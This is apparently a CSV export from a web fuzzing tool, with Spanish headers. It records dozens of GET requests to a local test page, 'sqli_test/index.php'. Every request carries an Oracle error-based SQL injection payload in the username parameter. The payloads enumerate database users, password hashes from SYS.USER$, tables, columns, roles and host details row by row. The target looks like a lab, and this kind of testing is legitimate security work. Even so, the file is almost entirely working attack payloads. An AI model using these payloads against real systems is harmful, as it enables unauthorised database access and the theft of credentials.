Identificación de pestaña,Tipo de mensaje,Petición (Tiempo),Método,URL,Código,Razón,RTT,Tamaño de la Cabecera de Pregunta,Tamaño Cuerpo de Petición,Tamaño de la Cabecera de Respuesta,Respuesta (Tamaño del cuerpo),Alerta mayor,Estado,Cargas Útiles
108,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20SYS.LOGIN_USER%20FROM%20DUAL))%20AND%20'i'='i&password=prueba,200,OK,11,545,0,227,373,,,[' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i]
109,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20SYS.DATABASE_NAME%20FROM%20DUAL))%20AND%20'i'='i&password=prueba,200,OK,8,548,0,227,373,,,[' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i]
112,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20COUNT(DISTINCT(USERNAME))%20FROM%20SYS.ALL_USERS))%20AND%20'i'='i&password=prueba,200,OK,7,565,0,227,358,,,[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i]
110,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20host_name%20FROM%20v$instance))%20AND%20'i'='i&password=prueba,200,OK,18,546,0,227,324,,,[' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i]
113,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20COUNT(DISTINCT(PASSWORD))%20FROM%20SYS.USER$))%20AND%20'i'='i&password=prueba,200,OK,14,561,0,227,354,,,[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i]
111,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20global_name%20FROM%20global_name))%20AND%20'i'='i&password=prueba,200,OK,10,549,0,227,325,,,[' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i]
115,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20COUNT(DISTINCT(column_name))%20FROM%20sys.all_tab_columns))%20AND%20'i'='i&password=prueba,200,OK,11,574,0,227,364,,,[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i]
114,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20COUNT(DISTINCT(table_name))%20FROM%20sys.all_tables))%20AND%20'i'='i&password=prueba,200,OK,14,568,0,227,359,,,[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i]
118,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(PASSWORD)%20FROM%20(SELECT%20DISTINCT(PASSWORD),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.USER$)%20WHERE%20LIMIT=1))%20AND%20'i'='i&password=prueba",200,OK,10,634,0,227,501,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i]"
116,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20COUNT(DISTINCT(GRANTED_ROLE))%20FROM%20DBA_ROLE_PRIVS%20WHERE%20GRANTEE=SYS.LOGIN_USER))%20AND%20'i'='i&password=prueba,200,OK,14,603,0,227,328,,,[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i]
117,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(USERNAME)%20FROM%20(SELECT%20DISTINCT(USERNAME),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_USERS)%20WHERE%20LIMIT=1))%20AND%20'i'='i&password=prueba",200,OK,19,638,0,227,505,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i]"
119,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(table_name)%20FROM%20(SELECT%20DISTINCT(table_name),%20ROWNUM%20AS%20LIMIT%20FROM%20sys.all_tables)%20WHERE%20LIMIT=1))%20AND%20'i'='i&password=prueba",200,OK,16,643,0,227,506,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i]"
121,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(granted_role)%20FROM%20(SELECT%20DISTINCT(granted_role),%20ROWNUM%20AS%20LIMIT%20FROM%20dba_role_privs%20WHERE%20GRANTEE=SYS.LOGINUSER)%20WHERE%20LIMIT=1))%20AND%20'i'='i&password=prueba",200,OK,12,679,0,227,510,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i]"
120,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(column_name)%20FROM%20(SELECT%20DISTINCT(column_name),%20ROWNUM%20AS%20LIMIT%20FROM%20all_tab_columns)%20WHERE%20LIMIT=1))%20AND%20'i'='i&password=prueba",200,OK,27,646,0,227,507,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i]"
124,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(table_name)%20FROM%20(SELECT%20DISTINCT(table_name),%20ROWNUM%20AS%20LIMIT%20FROM%20sys.all_tables)%20WHERE%20LIMIT=2))%20AND%20'i'='i&password=prueba",200,OK,19,643,0,227,506,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i]"
122,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(USERNAME)%20FROM%20(SELECT%20DISTINCT(USERNAME),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_USERS)%20WHERE%20LIMIT=2))%20AND%20'i'='i&password=prueba",200,OK,9,638,0,227,505,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i]"
125,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(column_name)%20FROM%20(SELECT%20DISTINCT(column_name),%20ROWNUM%20AS%20LIMIT%20FROM%20all_tab_columns)%20WHERE%20LIMIT=2))%20AND%20'i'='i&password=prueba",200,OK,14,646,0,227,507,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i]"
123,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(PASSWORD)%20FROM%20(SELECT%20DISTINCT(PASSWORD),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.USER$)%20WHERE%20LIMIT=2))%20AND%20'i'='i&password=prueba",200,OK,9,634,0,227,501,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i]"
127,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(USERNAME)%20FROM%20(SELECT%20DISTINCT(USERNAME),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_USERS)%20WHERE%20LIMIT=3))%20AND%20'i'='i&password=prueba",200,OK,21,638,0,227,505,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i]"
128,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(PASSWORD)%20FROM%20(SELECT%20DISTINCT(PASSWORD),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.USER$)%20WHERE%20LIMIT=3))%20AND%20'i'='i&password=prueba",200,OK,19,634,0,227,501,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i]"
130,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(column_name)%20FROM%20(SELECT%20DISTINCT(column_name),%20ROWNUM%20AS%20LIMIT%20FROM%20all_tab_columns)%20WHERE%20LIMIT=3))%20AND%20'i'='i&password=prueba",200,OK,3,646,0,227,507,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i]"
126,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(granted_role)%20FROM%20(SELECT%20DISTINCT(granted_role),%20ROWNUM%20AS%20LIMIT%20FROM%20dba_role_privs%20WHERE%20GRANTEE=SYS.LOGINUSER)%20WHERE%20LIMIT=2))%20AND%20'i'='i&password=prueba",200,OK,28,679,0,227,510,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i]"
129,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(table_name)%20FROM%20(SELECT%20DISTINCT(table_name),%20ROWNUM%20AS%20LIMIT%20FROM%20sys.all_tables)%20WHERE%20LIMIT=3))%20AND%20'i'='i&password=prueba",200,OK,17,643,0,227,506,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i]"
131,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(granted_role)%20FROM%20(SELECT%20DISTINCT(granted_role),%20ROWNUM%20AS%20LIMIT%20FROM%20dba_role_privs%20WHERE%20GRANTEE=SYS.LOGINUSER)%20WHERE%20LIMIT=3))%20AND%20'i'='i&password=prueba",200,OK,8,679,0,227,510,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i]"
132,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(USERNAME)%20FROM%20(SELECT%20DISTINCT(USERNAME),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_USERS)%20WHERE%20LIMIT=4))%20AND%20'i'='i&password=prueba",200,OK,9,638,0,227,505,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i]"
133,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(PASSWORD)%20FROM%20(SELECT%20DISTINCT(PASSWORD),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.USER$)%20WHERE%20LIMIT=4))%20AND%20'i'='i&password=prueba",200,OK,9,634,0,227,501,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i]"
135,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(column_name)%20FROM%20(SELECT%20DISTINCT(column_name),%20ROWNUM%20AS%20LIMIT%20FROM%20all_tab_columns)%20WHERE%20LIMIT=4))%20AND%20'i'='i&password=prueba",200,OK,9,646,0,227,507,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i]"
136,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(granted_role)%20FROM%20(SELECT%20DISTINCT(granted_role),%20ROWNUM%20AS%20LIMIT%20FROM%20dba_role_privs%20WHERE%20GRANTEE=SYS.LOGINUSER)%20WHERE%20LIMIT=4))%20AND%20'i'='i&password=prueba",200,OK,10,679,0,227,510,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i]"
137,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(USERNAME)%20FROM%20(SELECT%20DISTINCT(USERNAME),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_USERS)%20WHERE%20LIMIT=5))%20AND%20'i'='i&password=prueba",200,OK,12,638,0,227,505,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i]"
139,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(table_name)%20FROM%20(SELECT%20DISTINCT(table_name),%20ROWNUM%20AS%20LIMIT%20FROM%20sys.all_tables)%20WHERE%20LIMIT=5))%20AND%20'i'='i&password=prueba",200,OK,8,643,0,227,506,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i]"
134,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(table_name)%20FROM%20(SELECT%20DISTINCT(table_name),%20ROWNUM%20AS%20LIMIT%20FROM%20sys.all_tables)%20WHERE%20LIMIT=4))%20AND%20'i'='i&password=prueba",200,OK,28,643,0,227,506,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i]"
142,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(USERNAME)%20FROM%20(SELECT%20DISTINCT(USERNAME),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_USERS)%20WHERE%20LIMIT=6))%20AND%20'i'='i&password=prueba",200,OK,11,638,0,227,505,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i]"
138,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(PASSWORD)%20FROM%20(SELECT%20DISTINCT(PASSWORD),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.USER$)%20WHERE%20LIMIT=5))%20AND%20'i'='i&password=prueba",200,OK,17,634,0,227,501,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i]"
141,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(granted_role)%20FROM%20(SELECT%20DISTINCT(granted_role),%20ROWNUM%20AS%20LIMIT%20FROM%20dba_role_privs%20WHERE%20GRANTEE=SYS.LOGINUSER)%20WHERE%20LIMIT=5))%20AND%20'i'='i&password=prueba",200,OK,7,679,0,227,510,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i]"
140,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(column_name)%20FROM%20(SELECT%20DISTINCT(column_name),%20ROWNUM%20AS%20LIMIT%20FROM%20all_tab_columns)%20WHERE%20LIMIT=5))%20AND%20'i'='i&password=prueba",200,OK,12,646,0,227,507,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i]"
143,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(PASSWORD)%20FROM%20(SELECT%20DISTINCT(PASSWORD),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.USER$)%20WHERE%20LIMIT=6))%20AND%20'i'='i&password=prueba",200,OK,9,634,0,227,501,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i]"
144,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(table_name)%20FROM%20(SELECT%20DISTINCT(table_name),%20ROWNUM%20AS%20LIMIT%20FROM%20sys.all_tables)%20WHERE%20LIMIT=6))%20AND%20'i'='i&password=prueba",200,OK,17,643,0,227,506,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i]"
147,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(USERNAME)%20FROM%20(SELECT%20DISTINCT(USERNAME),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_USERS)%20WHERE%20LIMIT=7))%20AND%20'i'='i&password=prueba",200,OK,10,638,0,227,505,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i]"
145,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(column_name)%20FROM%20(SELECT%20DISTINCT(column_name),%20ROWNUM%20AS%20LIMIT%20FROM%20all_tab_columns)%20WHERE%20LIMIT=6))%20AND%20'i'='i&password=prueba",200,OK,20,646,0,227,507,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i]"
146,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(granted_role)%20FROM%20(SELECT%20DISTINCT(granted_role),%20ROWNUM%20AS%20LIMIT%20FROM%20dba_role_privs%20WHERE%20GRANTEE=SYS.LOGINUSER)%20WHERE%20LIMIT=6))%20AND%20'i'='i&password=prueba",200,OK,11,679,0,227,510,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i]"
148,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(PASSWORD)%20FROM%20(SELECT%20DISTINCT(PASSWORD),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.USER$)%20WHERE%20LIMIT=7))%20AND%20'i'='i&password=prueba",200,OK,9,634,0,227,501,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i]"
150,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(column_name)%20FROM%20(SELECT%20DISTINCT(column_name),%20ROWNUM%20AS%20LIMIT%20FROM%20all_tab_columns)%20WHERE%20LIMIT=7))%20AND%20'i'='i&password=prueba",200,OK,11,646,0,227,507,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i]"
149,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(table_name)%20FROM%20(SELECT%20DISTINCT(table_name),%20ROWNUM%20AS%20LIMIT%20FROM%20sys.all_tables)%20WHERE%20LIMIT=7))%20AND%20'i'='i&password=prueba",200,OK,16,643,0,227,506,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i]"
152,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(USERNAME)%20FROM%20(SELECT%20DISTINCT(USERNAME),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_USERS)%20WHERE%20LIMIT=8))%20AND%20'i'='i&password=prueba",200,OK,21,638,0,227,505,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i]"
151,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(granted_role)%20FROM%20(SELECT%20DISTINCT(granted_role),%20ROWNUM%20AS%20LIMIT%20FROM%20dba_role_privs%20WHERE%20GRANTEE=SYS.LOGINUSER)%20WHERE%20LIMIT=7))%20AND%20'i'='i&password=prueba",200,OK,21,679,0,227,510,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i]"
153,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(PASSWORD)%20FROM%20(SELECT%20DISTINCT(PASSWORD),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.USER$)%20WHERE%20LIMIT=8))%20AND%20'i'='i&password=prueba",200,OK,21,634,0,227,501,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i]"
